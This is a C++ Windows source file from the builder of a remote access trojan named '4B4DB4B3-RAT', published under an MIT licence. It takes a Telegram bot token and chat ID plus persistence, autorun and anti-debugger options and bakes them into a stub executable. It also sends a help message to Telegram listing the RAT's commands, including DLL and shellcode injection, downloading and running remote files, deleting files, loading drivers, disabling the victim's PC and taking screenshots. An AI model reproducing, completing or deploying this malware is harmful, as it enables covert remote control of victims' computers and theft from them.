/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "DlgProc.h"
#include "Builder.h"
#include "Requests.h"

#include "resource.h"

HWND hWndDlg;
HBRUSH brDlg = CreateSolidBrush(RGB(37, 37, 38));

INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	hWndDlg = hWnd;
	switch (uMsg) {
		case WM_CTLCOLORDLG:
			return (UINT)brDlg;

		case WM_CTLCOLORSTATIC:
		{
			HDC dcStatic = (HDC)wParam;

			SetTextColor(dcStatic, RGB(255, 255, 255));
			SetBkMode(dcStatic, TRANSPARENT);

			return (UINT)brDlg;
		}

		case WM_CTLCOLOREDIT:
		{
			HDC dcEdit = (HDC)wParam;

			SetTextColor(dcEdit, RGB(255, 255, 255));
			SetBkMode(dcEdit, TRANSPARENT);

			return (UINT)brDlg;
		}

		case WM_LBUTTONDOWN:
		{
			SendMessage(hWnd, WM_NCLBUTTONDOWN, HTCAPTION, 0);
			return 0;
		}

		case WM_COMMAND:
		{
			switch (LOWORD(wParam)) {
				case IDC_STATIC1:
				{
					ExitProcess(0);
					return 0;
				}
				case IDC_STATIC2:
				{
					ShowWindow(hWnd, SW_MINIMIZE);
					return 0;
				}
				case IDC_STATIC3:
				{
					Settings s;
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), s.botapi, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), s.chatid, 127);

					INT TextLen = GetWindowTextLengthA(GetDlgItem(hWnd, IDC_EDIT3)) + 1;
					char* buff = new char[TextLen];
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT3), buff, TextLen);

					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT4), s.drop, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT5), s.client_delay, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT6), s.autorun, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT7), s.scheduler_name, 127);

					UINT State = SendMessage(GetDlgItem(hWnd, IDC_CHECK1), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.auto_delete = true;
					}
					else {
						s.auto_delete = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK2), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.autorun_state = true;
					}
					else {
						s.autorun_state = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK3), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.drop_run = true;
					}
					else {
						s.drop_run = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK4), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.protect_debuggers = true;
					}
					else {
						s.protect_debuggers = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK5), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.scheduler_state = true;
					}
					else {
						s.scheduler_state = false;
					}

					if (!MakeFile("Stub.exe", buff, &s)) {
						MessageBoxA(NULL, "Error! Maybe, stub not found?", "ERROR", MB_OK | MB_ICONERROR);
					}
					else {
						MessageBoxA(NULL, "Success!", "BUILDER", MB_OK | MB_ICONINFORMATION);
					}

					delete[] buff;
					return 0;
				}
				case IDC_STATIC4:
				{
					char api[128], chatid[128];
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), api, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), chatid, 127);
					
					std::string path = "bot" + std::string(api) + "/getUpdates";
					GetRequest("api.telegram.org", "4B4DB4B3", path.c_str());

					std::string text = "Hello! 4B4DB4B3-RAT was activated!%0A"
						"%0A"
						"Commands: %0A"
						"%0AProcess manager: %0A"
						"/user[ID] processes - get process list %0A"
						"/user[ID] closeproc [processname.exe] - close process %0A"
						"/user[ID] inject_dll [processname.exe] [C:\\Path\\To\\File.dll] - Inject dll in process %0A"
						"/user[id] inject_shell [processname.exe] [shellcode] - Inject shellcode in process"

						"%0AAuxiliary:%0A"
						"/user[ID] loader [LINK] [PATH] - upload file from [LINK] to [PATH] %0A"
						"/user[ID] run [PATH] [ARGS] - run file from [PATH] with arguments [ARGS]%0A"

						"%0AJokes:%0A"
						"/user[ID] disable pc - disable computer of user %0A"
						"/user[ID] close - close rat %0A"
						"/user[ID] disable display - disable display user %0A"

						"%0AFile manager:%0A"
						"/user[ID] dir show [C:\\Folder] - show files and folders in directory %0A"
						"/user[ID] dir del_file C:\\Path\\To\\File.exe - delete file in directory %0A"

						"%0AService manager:%0A"
						"/user[ID] service show - show all services in system %0A"
						"/user[ID] service add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] - load driver to system %0A"
						"/user[ID] service delete [NameService] - delete service from system %0A"

						"%0AScreen manager:%0A"
						"/user[ID] screenshot - take screenshot and send you %0A"

						"%0ARAT:%0A"
						"/online - show online users%0A";
						
					path = "bot" + std::string(api) + "/sendMessage?chat_id=" + std::string(chatid) + "&text=" + text;
					GetRequest("api.telegram.org", "B4DB4B3", path.c_str());

					return 0;
				}
			}
			return 0;
		}

		case WM_DESTROY:
		{
			EndDialog(hWnd, 0);
			return 0;
		}
	}
	return 0;
}